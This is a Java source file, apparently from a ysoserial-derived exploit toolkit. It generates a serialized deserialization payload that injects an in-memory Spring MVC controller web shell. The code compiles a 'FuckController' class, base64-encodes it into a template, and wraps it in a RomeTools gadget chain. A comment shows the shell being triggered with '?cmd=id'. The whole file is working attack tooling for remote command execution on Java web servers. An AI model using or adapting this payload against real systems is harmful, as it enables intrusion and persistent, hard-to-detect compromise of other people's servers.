package ysoserial.payloads.memshell;

import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Encoder;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

// /1nhann?cmd=id
public class SpringControllerShell {
    public static void main(final String[] args) throws Exception {
        Object evil = new SpringControllerShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        byte[] bytes = ReadWrite.readResource(SpringControllerShell.class,"内存马/springmvc/SpringControllerShell.java");
        String java = new String(bytes);

        bytes = ReadWrite.readResource(SpringControllerShell.class,"内存马/springmvc/FuckController.java");
        String controllerCode = new String(bytes);

        byte[] b = JavaCompiler.compile("FuckController",controllerCode);
        String b64 = Encoder.base64_encode(b);

        java = java.replace("%b64%",b64);

        b = JavaCompiler.compile("SpringControllerShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }
}
